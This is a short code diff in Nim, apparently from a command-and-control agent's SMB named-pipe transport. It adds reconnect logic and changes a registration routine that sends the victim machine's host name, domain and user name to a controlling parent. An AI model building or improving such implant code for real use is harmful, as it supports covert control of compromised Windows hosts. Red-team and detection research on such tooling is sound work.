@@ -78,7 +78,28 @@ proc exeName*(): string =
     let i = max(full.rfind('\\'), full.rfind('/'))
     return if i < 0: full else: full[i+1..^1]
 
+proc reconnectPipe(t: var AgentTransport) =
+  ## Close stale handle and open a fresh pipe instance.
+  ## handleConn on the parent creates a new instance immediately after exiting,
+  ## so this gives us a live connection on the next register() attempt.
+  if t.pipe != INVALID_HANDLE_VALUE:
+    discard CloseHandle(t.pipe)
+    t.pipe = INVALID_HANDLE_VALUE
+  let full = if SMBPipe.startsWith("\\\\"): SMBPipe else: r"\\.\pipe\" & SMBPipe
+  for _ in 0..<30:
+    t.pipe = openPipe(SMBPipe)
+    if t.pipe != INVALID_HANDLE_VALUE: return
+    discard WaitNamedPipeW(newWideCString(full), 5000)
+    Sleep(1000)
+
 proc register*(t: var AgentTransport): bool =
+  # Reconnect before each attempt: if the previous register() failed because
+  # handleConn returned early (doRequest error), the server has a new pipe
+  # instance ready and we need a fresh client-side handle to reach it.
+  if t.pipe == INVALID_HANDLE_VALUE:
+    reconnectPipe(t)
+    if t.pipe == INVALID_HANDLE_VALUE: return false
+
   let regHost = getEnvStr("COMPUTERNAME", "UNKNOWN").toLowerAscii()
   let regDom  = getEnvStr("USERDOMAIN", "")
   let regUsr  = getEnvStr("USERNAME", "UNKNOWN")
@@ -98,7 +119,11 @@ proc register*(t: var AgentTransport): bool =
   }
   pipeWriteMsg(t.pipe, cast[seq[byte]]($req))
   let resp = pipeReadMsg(t.pipe)
-  if resp.len == 0: return false
+  if resp.len == 0:
+    # Write or read failed — mark pipe as broken so next call reconnects.
+    discard CloseHandle(t.pipe)
+    t.pipe = INVALID_HANDLE_VALUE
+    return false
   try:
     let j = parseJson(cast[string](resp))
     t.agentId = j["agent_id"].getStr()
